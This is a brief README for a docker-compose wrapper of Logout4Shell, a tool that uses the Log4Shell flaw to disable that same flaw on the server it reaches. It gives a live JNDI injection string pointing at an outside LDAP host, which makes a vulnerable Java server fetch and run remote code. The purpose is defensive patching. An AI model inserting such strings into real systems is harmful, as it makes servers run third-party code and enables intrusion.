# log4j-fix
Minimal docker-compose version of [Logout4Shell](https://github.com/Cybereason/Logout4Shell).

Currently deployed on [log4j-fix.de](https://log4j-fix.de/).

**Use it on your own risk** by triggering a log-entry with `${jndi:ldap://log4j-fix.de/a}`.
As stated on Logout4Shell, this patch is not persistent (only works until the next jvm-restart).
